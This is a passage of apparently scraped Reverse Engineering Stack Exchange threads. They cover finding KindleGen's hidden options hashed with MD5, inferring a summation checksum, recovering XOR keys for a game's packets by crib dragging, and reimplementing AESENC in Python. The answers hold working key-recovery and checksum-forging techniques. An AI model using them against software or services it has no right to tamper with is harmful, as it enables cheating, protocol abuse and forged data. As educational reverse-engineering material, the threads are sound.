</blockquote>

<p>Typically you don't need to analyze the entire program, but only the entrypoints for user-input. Yes, it's still a lot of work, but if the results are fruitful then that's all that matters.</p>

<blockquote>
  <p>So are malware author just monitoring various sources (bug reporting
  site or similar) in the hope of hearing about such cases to look into
  it?</p>
</blockquote>

<p>Most malware does not propagate via security exploits, but by simple social-engineering (""here, run this .exe""). For malware that does exploit security vulnerabilities, the authors either rely on modules from <a href=""http://www.rapid7.com/db/modules/"">Metasploit</a> or buy exploits from the black market. It's extremely rare for a single person to be both a vulnerability finder <em>and</em> a malware author.</p>
","3213"
"How to find obfuscated hidden command line parameters?","614","","<p>The Amazon KindleGen command line app (<a href=""https://www.amazon.com/gp/feature.html?docId=1000765211"" rel=""nofollow noreferrer"">Windows, macOS, Linux</a> download links) has several undocumented command line parameters that I'm curious about. One of these hidden command line parameters is:</p>

<pre><code>-dont_append_source
</code></pre>

<p>However, this string can't be found with the <strong>strings</strong> app or any of the many dissassemblers that I tried. It's therefore highly likely that some of the command line parameters have been obfuscated. </p>

<p>There are at least 8 of them:</p>

<pre><code>option: (hidden) Skip the HTML cleanup
option: (hidden) creates json position map file for debugging purpose.
option: (hidden) creates mobi for older devices.
option: (hidden) Using manual(tag based) fragmentation mode for building Webkit reader compatible mobi.
option: (hidden) Webkit reader Compatible mobi will be built
option: (hidden) fragsize
option: (hidden) custom image size will be used for resizing
option: (hidden) amazon creator tool or pipeline
</code></pre>

<p>Are there any special tools out there that I could use to deobfuscate these hidden command line parameters?</p>
","<p>those command line switches seems to be plainly visible in several languages </p>

<p><strong>kind:>kindlegen.exe -dont_append_source</strong></p>

<pre><code>Info:I9018:option: -donotaddsource: Source files will not be added
</code></pre>

<p><strong>kind:>strings -o kindlegen.exe | grep -i donotaddsource</strong></p>

<pre><code>5130184:option: -donotaddsource: Source files will not be added
5208360:Option: -donotaddsource: Quelldateien werden nicht hinzugef
5287768:option: -donotaddsource: Les fichiers sources se seront pas ajout
5367504:opzione: -donotaddsource: I file sorgente non verranno aggiunti
5448722:n: -donotaddsource: no se agregan los archivos fuente
5482150:-donotaddsource
5524610:: -donotaddsource:
5595760:o:-donotaddsource: Os arquivos de origem n
5673552:: -donotaddsource:
5748880:optie: -donotaddsource: bronbestanden worden niet toegevoegd
</code></pre>

<p>binary dump at offset as shown by strings.exe</p>

<pre><code>kind:\&gt;xxd -s 5130184 -g1 -l0x70 kindlegen.exe
04e47c8: 6f 00 70 00 74 00 69 00 6f 00 6e 00 3a 00 20 00  o.p.t.i.o.n.:. .
04e47d8: 2d 00 64 00 6f 00 6e 00 6f 00 74 00 61 00 64 00  -.d.o.n.o.t.a.d.
04e47e8: 64 00 73 00 6f 00 75 00 72 00 63 00 65 00 3a 00  d.s.o.u.r.c.e.:.
04e47f8: 20 00 53 00 6f 00 75 00 72 00 63 00 65 00 20 00   .S.o.u.r.c.e. .
04e4808: 66 00 69 00 6c 00 65 00 73 00 20 00 77 00 69 00  f.i.l.e.s. .w.i.
04e4818: 6c 00 6c 00 20 00 6e 00 6f 00 74 00 20 00 62 00  l.l. .n.o.t. .b.
04e4828: 65 00 20 00 61 00 64 00 64 00 65 00 64 00 00 00  e. .a.d.d.e.d...
</code></pre>

<p><strong>searching in  windbg</strong> </p>

<pre><code>kindle:\&gt;echo get bounds of exe &amp; cdb -c ""lm m kin*;q"" kindlegen.exe | grep def
get bounds of exe
00400000 00bdd000   kindlegen   (deferred)
kindle:\&gt;echo search string within bounds &amp; cdb -c ""lm m kin*;s -u kindlegen L?(0xbdd000
-0x400000) donotaddsource: ; q"" kindlegen.exe | grep quit: -B 11
search for emitted string within bounds
start    end        module name
00400000 00bdd000   kindlegen   (deferred)
008e59da  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
008f8b3a  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
0090c16a  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
0091f8e4  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
0093361a  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
00945e88  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
00957476  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
0096a456  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
0097caa0  0064 006f 006e 006f 0074 0061 0064 0064  d.o.n.o.t.a.d.d.
quit:
</code></pre>

<p><strong>maybe all the commandline switches</strong> </p>

<p><strong>0:000> .foreach (place { s -[1]u 400000 bdd000 option:}) {du /c100 place }</strong></p>

<pre><code>00839650  ""option: {0}""
008e5478  ""option: -preserve_img: Original Image size will be preserved""
008e54f8  ""option: -image64K: The maximum size of the image is restricted to 64K""
008e5588  ""option: -image128K: The maximum size of the image is restricted to 128K""
008e5618  ""option: -gif: gif image conversion (no jpeg)""
008e5674  ""option: -c0: No compression""
008e56b0  ""option: -c1: Standard DOC compression""
008e5700  ""option: -c2: Kindle Huffdic compression""
008e5750  ""option: -allscript: Authorize all scripting""
008e57a8  ""option: -western: Forced Windows-1252 output""
008e5808  ""option: -verbose: Verbose output""
008e5850  ""option: -noparseback: Parse back won't be built""
008e58b0  ""option: -regserver: The XOPFPlugin type library has been registered""
008e5938  ""option: -unregserver: The XOPFPlugin type library has been unregistered""
008e59c8  ""option: -donotaddsource: Source files will not be added""
008e5a38  ""option: (hidden) Skip the HTML cleanup""
008e5a88  ""option: (hidden) creates json position map file for debugging purpose.""
008e5b18  ""option: (hidden) creates mobi for older devices.""
008e5b80  ""option: (hidden) Using manual(tag based) fragmentation mode for building Webkit reader compatible mobi.""
008e5c50  ""option: (hidden) Webkit reader Compatible mobi will be built""
008e5ccc  ""option: (hidden) fragsize""
008e5d00  ""option: (hidden) custom image size will be used for resizing""
008e5d80  ""option: (hidden) amazon creator tool or pipeline""
008e5de8  ""option: -genhdcontainers: eMM will be built with given resolutions""
0090bbc0  ""option: -preserve_img: La taille d'origine de l'image sera préservée""
0090bc50  ""option: -image64K: La taille maximum de l'image est limitée à 64K""
0090bcd8  ""option: -image128K: La taille maximum de l'image est limitée à 128K""
0090bd60  ""option: -gif: Conversion d'image gif (pas jpeg)""
0090bdc0  ""option: -c0: Aucune compression""
0090be00  ""option: -c1: Compression DOC standard""
0090be50  ""option: -c2: Compression Kindle Huffdic""
0090bea0  ""option: -allscript: Autorise toutes les scénarisations""
0090bf10  ""option: -western: Sortie Windows-1252 forcée""
0090bf70  ""option: -verbose: Sortie Verbose""
0090bfb8  ""option: -noparseback: Parse back ne sera pas construit""
0090c028  ""option: -regserver: Le type de bibliothèque XOPFPlugin a été enregistré""
0090c0b8  ""option: -unregserver: Le type de bibliothèque XOPFPlugin a été désenregistré""
0090c158  ""option: -donotaddsource: Les fichiers sources se seront pas ajoutés""
0090c1e0  ""option: (masquée) Sauter le nettoyage HTML""
0090c238  ""option: (masquée) Crée fichier de carte de position json dans le but d'un débogage.""
0090c2e0  ""option: (masquée) crée un mobi pour les appareils plus anciens.""
0090c360  ""option: (masquée) Utilisation du mode de fragmentation manuelle (basé sur les balises) pour construire un lecteur Webkit compatible mobi.""
0090c478  ""option: (masquée) Un lecteur Webkit compatible mobi sera construit""
0090c500  ""option: (masquée) fragsize""
0090c538  ""option: (masquée) la taille d'image personnalisée sera utilisée pour redimmensionement""
0090c5e8  ""option: (caché) amazon créateur outil ou d'un pipeline""
009bbe70  ""option: {0}""
</code></pre>

<p>the argument strings are hashed with md5 and compared to blob it appears as Guntram blohm commented to your original query</p>

<p>with a fleet glance it appears the hashing function is an MD5 implementation</p>

<pre><code>CPU Disasm
Address                                    Hex dump          Command                                       Comments
006836F0 thiscallhashestheargstring (MD5)  /$  83EC 68       SUB     ESP, 68                               ; kindlegen.thiscallhashestheargstring (MD5)(guessed Arg1)
006836F3                                   |.  8B50 08       MOV     EDX, DWORD PTR DS:[EAX+8]
006836F6                                   |.  8B48 04       MOV     ECX, DWORD PTR DS:[EAX+4]
</code></pre>

<p>the possible md5 constants are visible inside the procedure</p>

<pre><code>CPU Disasm
Address   Command                                       Comments
006838FD  LEA     EAX, [EBX+EAX+D76AA478]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
00683904  ROL     EAX, 7
00683907  ADD     EAX, EDX
00683909  AND     EDI, EAX
0068390B  MOV     ECX, EAX
0068390D  NOT     ECX
0068390F  AND     ECX, ESI
00683911  OR      ECX, EDI
00683913  ADD     ECX, DWORD PTR SS:[ESP+3C]
00683917  MOV     DWORD PTR SS:[ESP+18], EBX
0068391B  LEA     ECX, [EBP+ECX+E8C7B756] &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
00683922  ROL     ECX, 0C
00683925  ADD     ECX, EAX
00683927  MOV     EDI, ECX
00683929  NOT     EDI
0068392B  AND     EDI, EDX
0068392D  MOV     EBX, ECX
0068392F  AND     EBX, EAX
00683931  OR      EDI, EBX
00683933  ADD     EDI, DWORD PTR SS:[ESP+40]
00683937  MOV     DWORD PTR SS:[ESP+30], ESI
0068393B  LEA     ESI, [ESI+EDI+242070DB] &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
</code></pre>

<p>the MD5 hash for some arg strings are </p>

<pre><code>cat dontapp.py
import md5
print md5.md5(""-dont_append_source"").hexdigest()
print md5.md5(""-intermediate_only"").hexdigest()
print md5.md5(""-releasenotes"").hexdigest()

python dontapp.py
8465b444e1fe29390e2bb6b98b878829
f837e7c59aeba2cfa4a0ccb7c941e1b8
2368d23829ad7e680cd23385b9fcff6a 
</code></pre>

<p><strong>and hash is compared to blob bytes here</strong> </p>

<p>Note passing invalid args like -abracadabra doesnt land in this comparison function so it is possible there is a pre check like argstr len etc </p>

<pre><code>CPU Disasm
Address                  Command                                       Comments
006832B0 whoknowswhat    PUSH    EBP                                   ; kindlegen.whoknowswhat(guessed Arg1,Arg2)
006832B1                 MOV     EBP, DWORD PTR SS:[ESP+8]
</code></pre>

<p><strong>a logging breakpoints yields this</strong></p>

<p><strong>-dont_append_source hash</strong></p>

<pre><code>006832B0  INT3: [esp+4] = 84 (132.)
006832B0  INT3: [esp+4] = 65 (101.)
006832B0  INT3: [esp+4] = 0B4 (180.)
006832B0  INT3: [esp+4] = 44 (68.)
006832B0  INT3: [esp+4] = 0E1 (225.)
006832B0  INT3: [esp+4] = 0FE (254.)
006832B0  INT3: [esp+4] = 29 (41.)
006832B0  INT3: [esp+4] = 39 (57.)
006832B0  INT3: [esp+4] = 0
006832B0  INT3: [esp+4] = 0E (14.)
006832B0  INT3: [esp+4] = 2B (43.)
006832B0  INT3: [esp+4] = 0B6 (182.)
006832B0  INT3: [esp+4] = 0B9 (185.)
006832B0  INT3: [esp+4] = 8B (139.)
006832B0  INT3: [esp+4] = 87 (135.)
006832B0  INT3: [esp+4] = 88 (136.)
006832B0  INT3: [esp+4] = 29 (41.)
</code></pre>

<p><strong>-intermediate_only hash</strong></p>

<pre><code>006832B0  INT3: [esp+4] = 0F8 (248.)
006832B0  INT3: [esp+4] = 37 (55.)
006832B0  INT3: [esp+4] = 0E7 (231.)
006832B0  INT3: [esp+4] = 0C5 (197.)
006832B0  INT3: [esp+4] = 9A (154.)
006832B0  INT3: [esp+4] = 0EB (235.)
006832B0  INT3: [esp+4] = 0A2 (162.)
006832B0  INT3: [esp+4] = 0CF (207.)
006832B0  INT3: [esp+4] = 0A4 (164.)
006832B0  INT3: [esp+4] = 0A0 (160.)
006832B0  INT3: [esp+4] = 0CC (204.)
006832B0  INT3: [esp+4] = 0B7 (183.)
006832B0  INT3: [esp+4] = 0C9 (201.)
006832B0  INT3: [esp+4] = 41 (65.)
006832B0  INT3: [esp+4] = 0E1 (225.)
006832B0  INT3: [esp+4] = 0B8 (184.)
</code></pre>

<p><strong>--releasenotes</strong></p>

<pre><code>006832B0  INT3: [esp+4] = 23 (35.)
006832B0  INT3: [esp+4] = 68 (104.)
006832B0  INT3: [esp+4] = 0D2 (210.)
006832B0  INT3: [esp+4] = 38 (56.)
006832B0  INT3: [esp+4] = 29 (41.)
006832B0  INT3: [esp+4] = 0AD (173.)
006832B0  INT3: [esp+4] = 7E (126.)
006832B0  INT3: [esp+4] = 68 (104.)
006832B0  INT3: [esp+4] = 0
006832B0  INT3: [esp+4] = 0C (12.)
006832B0  INT3: [esp+4] = 0D2 (210.)
006832B0  INT3: [esp+4] = 33 (51.)
006832B0  INT3: [esp+4] = 85 (133.)
006832B0  INT3: [esp+4] = 0B9 (185.)
006832B0  INT3: [esp+4] = 0FC (252.)
006832B0  INT3: [esp+4] = 0FF (255.)
006832B0  INT3: [esp+4] = 6A (106.)
</code></pre>
","14134"
"Reversing simple message + checksum pairs (32 bytes)","612","","<p>I am trying to determine the algorithm behind a 32-byte protected section of memory on a big-endian system. It will render invalid if even a single bit is changed, but I can generate any number of valid 32-byte messages.</p>

<p>Here shows a variety of example data. I believe the last 4 bytes are the checksum. All of them are accepted by the algorithm.</p>

<pre><code>00000000000000000000000000000000000000000007478A000101004892B760
F0000000000000000000000000000000000000000002D8DF00010100C9E23610
3065C0000000000000000000000000000000000000006F850001010060EB9F07
FFFFFFFF03FC6BBD000000000000000000000000000000000001010070B88F3A
FFFFFFFF0397E33D340C804138458C5006060968570C214B0001017AE8F416FE
</code></pre>

<p>I was able to create a bunch of custom messages with very little differences. Doesn't seem like it could be a CRC-32.</p>

<pre><code>FFFFFFFF01671F7E000000000000000000000000000000000001010021E4DE0E (00)
FFFFFFFF01671F84000000000000000000000000000000000001010021EADE08 (01)
FFFFFFFF01671F88000000000000000000000000000000000001010021EEDE04 (02)
FFFFFFFF01671F86000000000000000000000000000000000001010021ECDE06 (03)
FFFFFFFF01671F8C000000000000000000000000000000000001010021F2DE00 (04)
FFFFFFFF01671F8A000000000000000000000000000000000001010021F0DE02 (05)
FFFFFFFF01671F86000000000000000000000000000000000001010021ECDE06 (06)
FFFFFFFF01671F8C000000000000000000000000000000000001010021F2DE00 (07)
FFFFFFFF01671F90000000000000000000000000000000000001010021F6DDFC (08)
</code></pre>

<p>All of the input bytes are the same, except one byte that increases by 1 in each message.</p>

<p><a href=""http://pastebin.com/raw.php?i=vT6KPUQH"" rel=""nofollow"">Here</a> is a list of 50 or so pairs.</p>

<p><strong>Basically, are there any analysis methods that can be applied to a set of data to determine some properties of the algorithm? I can generate any number of these messages, and verify that they are accepted.</strong></p>

<p><em>Edit: By shifting a single bit, I noticed that 0x04 was added to two bytes, but subtracted to another (F84 -> F88,  1EA -> 1EE,  E08 -> E04).
After some experimentation (Mainly adding and subtracting different values and testing them) I was lucky that it turned out to be a summation of the fourteen preceding 16-bit words. AND-masking the sum by 0xFFFF, this value equals 15th word (e.g. 21EA in the first message).
This value is then subtracted from 0xFFF2 to produce the 16th word in the message.</em></p>

<pre><code>FFFFFFFF01671F84000000000000000000000000000000000001010021EADE08
FFFFFFFF01671F88000000000000000000000000000000000001010021EEDE04
</code></pre>
","<p>Some of the samples inputs shown differ only in the value of the sixteenth nibble; let 's(X)' stand for such an input with value X at that nibble:</p>

<pre><code>s(4): FFFFFFFF01671F840000000000000000000000000000000000010100 21EADE08
s(6): FFFFFFFF01671F860000000000000000000000000000000000010100 21ECDE06
s(8): FFFFFFFF01671F880000000000000000000000000000000000010100 21EEDE04
s(A): FFFFFFFF01671F8A0000000000000000000000000000000000010100 21F0DE02
s(C): FFFFFFFF01671F8C0000000000000000000000000000000000010100 21F2DE00
</code></pre>

<p>In a similar vein, let 'o(Y)' stand for the bit string consisting entirely of zeroes except for value Y at the sixteenth nibble.</p>

<p>Now, let's confront the XOR (bit difference) of certain inputs and the XOR of the corresponding checksums as MSB-first bitstrings:</p>

<pre><code>s(4) ^ s(6) = o(2), cksum delta: .............**.............***.
s(8) ^ s(A) = o(2), cksum delta: ...........****..............**.
s(8) ^ s(C) = o(4), cksum delta: ...........***...............*..
s(4) ^ s(C) = o(8), cksum delta: ...........**...............*...
</code></pre>

<p>The lowest set bit of the checksum differences is equal to the bit where the inputs differ, and there is a matching difference exactly sixteen bits higher. The bursts of set bits could be due to bubbling carries.</p>

<p>For comparison, here are the XOR differences between the corresponding CRC32 values:</p>

<pre><code>s(4) ^ s(6) = o(2), crc32 delta: .*****.*.......***...*..***..*..
s(8) ^ s(A) = o(2), crc32 delta: .*****.*.......***...*..***..*..
s(8) ^ s(C) = o(4), crc32 delta: *.***.**.....*..*****..*...*..*.
s(4) ^ s(C) = o(8), crc32 delta: .***.**.....*..*****..*...*..*.*
</code></pre>

<p>The structure of the changes is completely different and much more complicated. Note the CRC difference for inputs that differ in the same bit (first two lines), and the density of the differences which approaches the theoretical 50%. This is because CRCs have much better diffusion (avalance effect) than simple, empirical checksums.</p>

<p>And now the picture for a hash with near-perfect diffusion (the murmur hash mixer function):</p>

<pre><code>s(4) ^ s(6) = o(2), murmur delta: ..*..*.....**.**..*..*....**..**
s(8) ^ s(A) = o(2), murmur delta: .*.*.*.*.*..*..*.*.*.*.**.*.*.*.
s(8) ^ s(C) = o(4), murmur delta: ..****.*****.******.**.**.******
s(4) ^ s(C) = o(8), murmur delta: .***...***.**...*.*....**.*.**.*
</code></pre>

<p>It is easy to get a feel for the structure of a checksum by observing these differentials for increasingly complex functions: sum, xor, xorshift, some classical hashes.</p>

<p>Then turn the spotlight on your target function. Observe output differences for some fixed inputs, letting single bit flip wander through the string. Observe output differences for single-bit differences at certain fixed positions for a series of different inputs. Let the difference position hop in increments of 8 bits, observe the behaviour. Then try 32-bit hops, observe. If possible, focus initial investigation on the last 32 bits of the input, since their relation to the output is bound to be a lot simpler than that for bits that went through more iterations... The structure of the hash function cannot hide itself from you for long.</p>

<p>That was a look at xor differentials. Depending on the hypothesised structure of the checksum, other experiments are possible. As a real-life example, a few years back I had to deduce various check digit algorithms (similar in nature to the ISBN check digit algorithm) based on sample batches of (mostly) correct specimens. Since these algorithms are based on multiplying digits with certain position-dependent weights, I searched for pairs of numbers that differed only in one single digit apart from the checksum. By fixing certain hypotheses regarding how the sum is turned into a check digit, this allowed my to deduce the weight (1, 2, 3, 4...) for each digit and to identify the correct hypothesis for the sum.</p>

<p>In the case under consideration it is certainly suggestive that the sixteenth nibble and the final nibble of the checksum sum to 12 (0x0C), for the five samples that I used here.</p>

<p>So, the basic idea is to confront input differences with output differences, modulated by one's suspicion regarding the structure of the function that needs to be inferred. Things can get very tricky if sample pairs with minimal differences are scarce. Conversely, if you can produce samples at will (chosen-plaintext attack) then things are looking very good indeed... </p>
","6929"
"XOR Encryption (XPost from Crypto)","610","","<p>Dear <em>ReverseEngineering</em>@<strong>SE</strong>,</p>

<p><strong>Background information:</strong>
I have reason to believe that an old game I've played is still using their XOR encryption for nearly all in/out-going packets. I also believe that the key used in the encryption scheme remains static when I analyze the packet data, at least the frequency of certain values indicate so.</p>

<p>I know for a fact that previous keys has been 9-byte ASCII keys of length</p>

<p><strong>Problem:</strong>
I am not able to decrypt the packages. I've tried just directly looping the key, XOR'ing the data that is contained in the TCP packages and also tried the following C# function for XOR cryptography (See appendix).</p>

<p>Assuming Vigenere cipher is to be used as basis the previous keys suggest that the length might be 9 characters long.</p>

<p>I do have complete control of what the plaintext (ASCII in this case) of decrypted packages are gonna contain since I can use the chat functionality in the game. Thus I have tried sending the same message and observed the data difference within Wireshark as seen here:</p>

<p>Plaintext as sent in game: </p>

<blockquote>
  <p>TestingTheKeyTestingTheKeyTestingTheKeyTestingTheKey</p>
</blockquote>

<p>In the following snapshots are three packets of the same message. Notice how the length remains the same, further indicating a static key length:</p>

<p><a href=""https://i.imgur.com/m8CdEa1.png"" rel=""nofollow noreferrer"">Overview</a> <em>(3 dots indicating data traffic)</em></p>

<p><a href=""https://i.imgur.com/Y68samw.png"" rel=""nofollow noreferrer"">Data side-by-side</a> (<em>Non-header data highlighted</em>)</p>

<p>And finally: Hex dumps of the same packets. (See appendix)</p>

<p>I'm rather new to cryptography but find the field very interesting and hope that a kind spirit is willing to provide some assistance. Anything is appreciated.</p>

<p>Thank you.</p>

<p><strong>Appendix code</strong>
<a href=""http://pastebin.com/F0py05Lz"" rel=""nofollow noreferrer"">http://pastebin.com/F0py05Lz</a></p>

<p><strong>Hex dump (due to low rep)</strong></p>

<pre><code>0000   aa 00 41 0e ad ce ff ce f0 ef e9 a0 f1 f8 9b a2
0010   fe df f8 e5 9c fb ed b8 a0 f6 f0 ca f7 ae d6 f8
0020   b4 9c fc e5 eb f7 a4 fb c8 a2 aa d5 f4 e1 cd a8
0030   e8 ef a2 a0 f8 c4 f1 fd 87 ff e3 c8 c3 e2 99 42
0040   de 51 ef 2b

0000   aa 00 41 0e ae 9a a8 ca f2 eb bf a3 a1 aa cf f5
0010   fa dd fc b3 9f ab bf ec f7 f2 f2 ce a1 ad 86 aa
0020   e0 cb f8 e7 ef a1 a7 ab 9a f6 fd d1 f6 e5 9b ab
0030   b8 bd f6 f7 fc c6 f5 ab 84 af b1 9c 94 d9 fd 32
0040   91 07 59 ba

0000   aa 00 41 0e af 9b fe 9a f9 e8 e3 f1 f2 a9 ce a3
0010   aa d6 ff ef cd f8 bc ed a1 a2 f9 cd fd ff d5 a9
0020   e1 9d a8 ec ec fd f5 f8 99 f7 ab 81 fd e6 c7 f9
0030   eb be f7 a1 ac cd f6 f7 d6 fc b2 9d c2 3f 2d 7a
0040   bd f6 42 d6
</code></pre>
","<p>The keys for your three messages appear to be <code>cf7810d22</code>, <code>42096edac</code> and <code>4ea34873a</code> respectively.  (Note: those are 9-byte ASCII text strings, not hex numbers, even though clearly all the characters appear to be hex digits!)</p>

<hr>

<p>OK, so how did I figure that out?</p>

<p>First, before even looking at the code you posted, I just took the messages from your hex dump, converted them back into binary (using a quick Perl script), and XORed them together.  The resulting XORed messages look like this:</p>

<pre><code>$ perl -0777 -E '$a = &lt;&gt;; $b = &lt;&gt;; print $a ^ $b' packet1.dat packet2.dat | xxd
0000000: 0000 0000 0354 5704 0204 5603 5052 5457  .....TW...V.PRTW
0000010: 0402 0456 0350 5254 5704 0204 5603 5052  ...V.PRTW...V.PR
0000020: 5457 0402 0456 0350 5254 5704 0204 5603  TW...V.PRTW...V.
0000030: 5052 5457 0402 0456 0350 5254 573b 6470  PRTW...V.PRTW;dp
0000040: 4f56 b691                                OV..
</code></pre>

<p>XORing the ciphertexts together like this cancels out the plaintext (assuming that it's the same in both messages), leaving just the XOR of the keys.  We can see that there's a clear repeating 9-byte pattern in the XORed data, strongly suggesting that the messages have indeed been encrypted with a repeating 9-byte key.</p>

<p>Now, if that was <em>all</em>, we could find the key simply by taking the known plaintext string <code>TestingTheKeyTestingTheKeyTestingTheKeyTestingTheKey</code>, XORing it with the ciphertext at different positions (since I didn't know exactly where the known plaintext would occur in the encrypted message), and looking for a result that looks like a plausible key.  In crypto jargon, this method is known as <a href=""http://travisdazell.blogspot.in/2012/11/many-time-pad-attack-crib-drag.html"">crib dragging</a>, a term that dates back at least to <a href=""https://en.wikipedia.org/wiki/Bletchley_Park"">Bletchley Park</a> during WWII.</p>

<p>Alas, when I tried that, it didn't yield anything that looked anything like a repeating 9-byte text string, as I expected the key to be.  In fact, there were hardly any printable ASCII characters in the output at all.  Looking more closely at the ciphertext, I noticed that most of its bytes had the high bit set, something that <em>can't</em> happen when you XOR two ASCII characters together.  So clearly there had to be something else going on, too.</p>

<p>At that point, I took a closer look at your (presumably previously reverse-engineered) decryption code, and realized that it actually XORed the message with <em>three</em> different byte streams:</p>

<ol>
<li>the repeating 9-byte key (applied starting from the sixth byte),</li>
<li>the fifth byte of the ciphertext (<code>Incrementor</code>, presumably some kind of a message counter; this is what caused the high bits of each byte to be set, since in your messages it had values from <code>0xAD</code> to <code>0xAF</code>), applied to every following byte, and</li>
<li>a byte value (<code>KeyVal</code>) that starts at zero and is incremented by one every time the key repeats, i.e. every ninth byte after the sixth.</li>
</ol>

<p>(The code also skips step 3 if <code>KeyVal</code> equals <code>Incrementor</code>, presumably to prevent the last two steps from canceling each other out.  That little quirk actually has little if any cryptographic significance, and in any case, it will never happen for these short messages with high <code>Incrementor</code> values.)</p>

<p>Now, conveniently, the XOR operation, like addition, is commutative and associative &mdash; that is, if you XOR two or more bytes together, it doesn't matter which order you do it in: <code>(A XOR B) XOR C == A XOR (B XOR C) == A XOR (C XOR B) == (A XOR C) XOR B == ...</code>.  Thus, since I knew the <code>Incrementor</code> value for each message (since it's given <em>in</em> the encrypted message) and had a pretty solid guess for the repeating key length (which let me calculate <code>KeyVal</code> for each byte), I could just XOR each encrypted byte with those two values, leaving me with <em>just</em> the plaintext XORed with the repeating key.</p>

<p>After that, it was easy enough to discover by crib-dragging that the known plaintext string actually starts two bytes after the beginning of the encrypted portion (and so seven bytes after the beginning of the whole message), and obtain the 9-byte key for each message.</p>

<p>(What I <em>can't</em> tell from just your three sample messages is how those 9-byte key strings actually are generated, or how the game knows which key string to XOR a given message with.  For that, you may need to analyze more message packets and see if you can find any kind of pattern to the keys.)</p>
","11966"
"Reimplementing the x86 AESENC instruction in python","608","","<p>I'm having troubles implementing the AESENC x86 instruction in python.</p>

<p>I'm reverse engineering the decryption of a indie video game. They use AES but they xor some generated data around and the key expansion is not standard, so I need to use custom round keys. I'm nearly complete, but I'm stumped in that the game uses the AESENC x86 instruction, which performs a single round of AES. This seemed trivial to implement but I'm not getting the same results.</p>

<p>To be more precise, when setting breakpoints and looking at memory</p>

<pre><code>AESENC(E98E03FAEAD91A951F6269D0D4DAFAD6, C62E6AD8CC162D7E210D91A142F2927B) 
</code></pre>

<p>returns:</p>

<pre><code>AABCA9C13C842D3112C48E822B050CF8
</code></pre>

<p>While my python implementation returns:</p>

<pre><code>aabca9c13b88ae173e2ea2680d02007b
</code></pre>

<p>This seems to be only matching the first 4 bytes. 
My guess is that the mix_columns step is being done wrong, I've tried other implementations, but none seems to be matching the x86 instruction. I'm using the implementation found in the book <a href=""https://books.google.com/books?id=fNaoCAAAQBAJ&amp;lpg=PA1&amp;ots=7hJNyHRmob&amp;dq=The%20Design%20of%20Rijndael&amp;lr&amp;pg=PA54#v=onepage&amp;q&amp;f=false"" rel=""nofollow"">The Design of Rijndael Section 4.1.2</a></p>

<p>The only documentation I found on AESENC was <a href=""http://www.felixcloutier.com/x86/AESENC.html"" rel=""nofollow"">here</a>, which unfortunately doesn't go into details on how the functions are implemented. If anyone know where I can get implementation specifics on the AESENC please do :)</p>

<p>Here's my full python implementation of AESENC so far:
</p>

<pre><code>SBOX = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)

def list2hex(list):
    hex = """"
    for e in list:
